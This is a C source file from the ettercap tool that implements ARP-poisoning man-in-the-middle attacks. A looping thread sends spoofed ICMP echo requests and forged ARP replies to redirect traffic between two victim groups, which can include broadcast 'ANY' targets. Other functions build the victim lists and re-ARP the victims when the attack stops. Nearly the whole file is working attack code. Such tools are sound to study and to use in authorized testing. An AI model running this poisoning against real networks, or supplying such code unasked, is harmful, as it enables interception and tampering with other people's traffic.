/*
    ettercap -- ARP poisoning mitm module

    Copyright (C) ALoR & NaGA

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Header: /home/drizzt/dev/sources/ettercap.cvs/ettercap_ng/src/mitm/ec_arp_poisoning.c,v 1.3 2003/08/21 14:36:02 alor Exp $
*/

#include <ec.h>
#include <ec_mitm.h>
#include <ec_send.h>
#include <ec_threads.h>

#include <libnet.h>

/* globals */

/* 
 * this are the two lists for poisoning.
 * each element in the each list is associated with all the element
 * in the other list. this is done in every case.
 * if one associtation has two equal element, it will be skipped.
 * this is done to permit overlapping groups
 */
static LIST_HEAD(, hosts_list) group_one_head;
static LIST_HEAD(, hosts_list) group_two_head;

/* protos */

void arp_poisoning_init(void);
EC_THREAD_FUNC(poisoner);
static void arp_poisoning_start(void);
static void arp_poisoning_stop(void);
static int create_silent_list(void);
static int create_list(void);

/*******************************************/

/*
 * this function is the initializer.
 * it adds the entry in the table of registered mitm
 */

void __init arp_poisoning_init(void)
{
   struct mitm_method mm;

   mm.name = "arp";
   mm.start = &arp_poisoning_start;
   mm.stop = &arp_poisoning_stop;
   
   mitm_add(&mm);
}


/*
 * the real ARP POISONER thread
 */
EC_THREAD_FUNC(poisoner)
{
   int i = 1;
   struct hosts_list *g1, *g2;
  
   /* never ending loop */
   LOOP {
      
      CANCELLATION_POINT();
      
      /* walk the lists and poison the victims */
      LIST_FOREACH(g1, &group_one_head, next) {
         LIST_FOREACH(g2, &group_two_head, next) {

            /* equal ip must be skipped, you cant poison itself */
            if (!ip_addr_cmp(&g1->ip, &g2->ip))
               continue;
            
            /* 
             * send the spoofed ICMP echo request 
             * to force the arp entry in the cache
             */
            if (i == 1) {
               send_icmp_echo(ICMP_ECHO, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac);
               send_icmp_echo(ICMP_ECHO, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac);
            }
            
            /* the effective poisoning packets */
            send_arp(ARPOP_REPLY, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac); 
            send_arp(ARPOP_REPLY, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac); 
           
         }
      }
      
      /* 
       * wait the correct delay:
       * for the first 5 time use the warm_up
       * then use normal delay
       */
      if (i < 5) {
         sleep(GBL_CONF->arp_poison_warm_up);
         i++;
      } else
         sleep(GBL_CONF->arp_poison_delay);
   }
   
   return NULL; 
}


/*
 * init the ARP POISONING attack
 */
static void arp_poisoning_start(void)
{
   int ret;
   
   DEBUG_MSG("arp_poisoning_start");

   /* create the list used later to poison the targets */
   if (GBL_OPTIONS->silent && !GBL_OPTIONS->load_hosts)
      ret = create_silent_list();
   else
      ret = create_list();

   if (ret != ESUCCESS) {
      USER_MSG("FATAL: ARP poisoning process cannot start.\n");
      return;
   }

   /* create the poisoning thread */
   ec_thread_new("poisoner", "ARP poisoning module", &poisoner, NULL);
}


/*
 * shut down the poisoning process
 */
static void arp_poisoning_stop(void)
{
   int i;
   struct hosts_list *h;
   struct hosts_list *g1, *g2;
   
   DEBUG_MSG("arp_poisoning_stop");
   
   /* destroy the poisoner thread */
   ec_thread_destroy(ec_thread_getpid("poisoner"));
   USER_MSG("ARP poisoner deactivated.\n");
 

   USER_MSG("RE-ARPing the victims...\n");
   
   /* rearp the victims 3 time*/
   for (i = 0; i < 3; i++) {
      
      /* walk the lists and poison the victims */
      LIST_FOREACH(g1, &group_one_head, next) {
         LIST_FOREACH(g2, &group_two_head, next) {

            /* equal ip must be skipped */
            if (!ip_addr_cmp(&g1->ip, &g2->ip))
               continue;
            
            /* the effective poisoning packets */
            send_arp(ARPOP_REPLY, &g2->ip, g2->mac, &g1->ip, g1->mac); 
            send_arp(ARPOP_REPLY, &g1->ip, g1->mac, &g2->ip, g2->mac); 
            
         }
      }
      
      /* sleep the correct delay, same as warm_up */
      sleep(GBL_CONF->arp_poison_warm_up);
   }
   
   /* delete the elements in the first list */
   while (LIST_FIRST(&group_one_head) != NULL) {
      h = LIST_FIRST(&group_one_head);
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }
   
   /* delete the elements in the second list */
   while (LIST_FIRST(&group_two_head) != NULL) {
      h = LIST_FIRST(&group_two_head);
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }

}


/*
 * create the list of victims
 * in silent mode only the first target is selected and you 
 * have to specify the mac address if you have specified an
 * ip address. you can also have an 'ANY' target and the 
 * arp poisoning will be broadcasted.
 */
static int create_silent_list(void)
{
   struct ip_list *i, *j;
   struct hosts_list *h, *g;
   char tmp[MAX_ASCII_ADDR_LEN];
   char tmp2[MAX_ASCII_ADDR_LEN];
   
   DEBUG_MSG("create_silent_list");
  
   /* allocate the struct */
   h = calloc(1, sizeof(struct hosts_list));
   ON_ERROR(h, NULL, "can't allocate memory");
   g = calloc(1, sizeof(struct hosts_list));
   ON_ERROR(h, NULL, "can't allocate memory");
   
   USER_MSG("\nARP poisoning victims:\n\n");
   
/* examine the first target */
   if ((i = SLIST_FIRST(&GBL_TARGET1->ips)) != NULL) {
      
      /* the the ip was specified, even the mac address must be specified */
      if (!memcmp(GBL_TARGET1->mac, "\x00\x00\x00\x00\x00\x00", ETH_ADDR_LEN) ) {
         USER_MSG("\nERROR: MAC address must be specified in silent mode.\n");
         return -EFATAL;
      }
      
      USER_MSG(" TARGET 1 : %-15s %17s\n", ip_addr_ntoa(&i->ip, tmp), mac_addr_ntoa(GBL_TARGET1->mac, tmp2));
      
      /* copy the informations */
      memcpy(&h->ip, &i->ip, sizeof(struct ip_addr));
      memcpy(&h->mac, &GBL_TARGET1->mac, ETH_ADDR_LEN);
      
   } else {
      USER_MSG(" TARGET 1 : %-15s FF:FF:FF:FF:FF:FF\n", "ANY");
      
      /* set the broadcasts */
      memcpy(&h->ip, &GBL_IFACE->network, sizeof(struct ip_addr));
      /* XXX - IPv6 compatible */
      /* the broadcast is the network address | ~netmask */
      *(u_int32 *)&h->ip.addr |= ~(*(u_int32 *)&GBL_IFACE->netmask.addr);

      /* broadcast mac address */
      memcpy(&h->mac, ETH_BROADCAST, ETH_ADDR_LEN);
   }
   
/* examine the second target */   
   if ((j = SLIST_FIRST(&GBL_TARGET2->ips)) != NULL) {
      
      /* the the ip was specified, even the mac address must be specified */
      if (!memcmp(GBL_TARGET2->mac, "\x00\x00\x00\x00\x00\x00", ETH_ADDR_LEN) ) {
         USER_MSG("\nERROR: MAC address must be specified in silent mode.\n");
         return -EFATAL;
      }
      USER_MSG(" TARGET 2 : %-15s %17s\n", ip_addr_ntoa(&j->ip, tmp), mac_addr_ntoa(GBL_TARGET2->mac, tmp2));
      
      /* copy the informations */
      memcpy(&g->ip, &j->ip, sizeof(struct ip_addr));
      memcpy(&g->mac, &GBL_TARGET2->mac, ETH_ADDR_LEN);
      
   } else {
      USER_MSG(" TARGET 2 : %-15s FF:FF:FF:FF:FF:FF\n", "ANY");
      
      /* set the broadcasts */
      memcpy(&g->ip, &GBL_IFACE->network, sizeof(struct ip_addr));
      /* XXX - IPv6 compatible */
      /* the broadcast is the network address | ~netmask */
      *(u_int32 *)&g->ip.addr |= ~(*(u_int32 *)&GBL_IFACE->netmask.addr);

      /* broadcast mac address */
      memcpy(&g->mac, ETH_BROADCAST, ETH_ADDR_LEN);
   }

   if (i == j) {
      USER_MSG("\nERROR: Cannot poison theese targets...\n");
      SAFE_FREE(h);
      SAFE_FREE(g);
      return -EFATAL;
   }

   /* add the elements in the two lists */
   LIST_INSERT_HEAD(&group_one_head, h, next);
   LIST_INSERT_HEAD(&group_two_head, g, next);

   return ESUCCESS;
}


/*
 * create the list of multiple victims.
 * the list is joined with the hosts list created with the
 * initial arp scan because we need to know the mac address
 * of the victims
 */
static int create_list(void)
{
   struct ip_list *i;
   struct hosts_list *h, *g;
   char tmp[MAX_ASCII_ADDR_LEN];
   char tmp2[MAX_ASCII_ADDR_LEN];

   DEBUG_MSG("create_list");
   
   USER_MSG("\nARP poisoning victims:\n\n");
  
/* the first group */
   SLIST_FOREACH(i, &GBL_TARGET1->ips, next) {
      LIST_FOREACH(h, &GBL_HOSTLIST, next) {
         if (!ip_addr_cmp(&i->ip, &h->ip)) {
            USER_MSG(" GROUP 1 : %s %s\n", ip_addr_ntoa(&h->ip, tmp), mac_addr_ntoa(h->mac, tmp2));

            /* create the element and insert it in the list */
            g = calloc(1, sizeof(struct hosts_list));
            ON_ERROR(g, NULL, "can't allocate memory");

            memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
            memcpy(&g->mac, &h->mac, ETH_ADDR_LEN);
            
            LIST_INSERT_HEAD(&group_one_head, g, next);
         }
      }
   }
   
   /* the target is NULL. convert to ANY (all the hosts) */
   if (SLIST_FIRST(&GBL_TARGET1->ips) == NULL) {

      USER_MSG(" GROUP 1 : ANY (all the hosts in the list)\n");
      
      /* add them */ 
      LIST_FOREACH(h, &GBL_HOSTLIST, next) {
           
         /* create the element and insert it in the list */
         g = calloc(1, sizeof(struct hosts_list));
         ON_ERROR(g, NULL, "can't allocate memory");

         memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
         memcpy(&g->mac, &h->mac, ETH_ADDR_LEN);
           
         LIST_INSERT_HEAD(&group_one_head, g, next);
      }
   }

   USER_MSG("\n");
   
/* the second group */

   /* if the target was specified */
   SLIST_FOREACH(i, &GBL_TARGET2->ips, next) {
      LIST_FOREACH(h, &GBL_HOSTLIST, next) {
         if (!ip_addr_cmp(&i->ip, &h->ip)) {
            USER_MSG(" GROUP 2 : %s %s\n", ip_addr_ntoa(&h->ip, tmp), mac_addr_ntoa(h->mac, tmp2));
            
            /* create the element and insert it in the list */
            g = calloc(1, sizeof(struct hosts_list));
            ON_ERROR(g, NULL, "can't allocate memory");

            memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
            memcpy(&g->mac, &h->mac, ETH_ADDR_LEN);
            
            LIST_INSERT_HEAD(&group_two_head, g, next);
         }
      }
   }
   
   /* the target is NULL. convert to ANY (all the hosts) */
   if (SLIST_FIRST(&GBL_TARGET2->ips) == NULL) {

      USER_MSG(" GROUP 2 : ANY (all the hosts in the list)\n");
      
      /* add them */ 
      LIST_FOREACH(h, &GBL_HOSTLIST, next) {
           
         /* create the element and insert it in the list */
         g = calloc(1, sizeof(struct hosts_list));
         ON_ERROR(g, NULL, "can't allocate memory");

         memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
         memcpy(&g->mac, &h->mac, ETH_ADDR_LEN);
           
         LIST_INSERT_HEAD(&group_two_head, g, next);
      }
   }
   
   return ESUCCESS;
}

/* EOF */

// vim:ts=3:expandtab

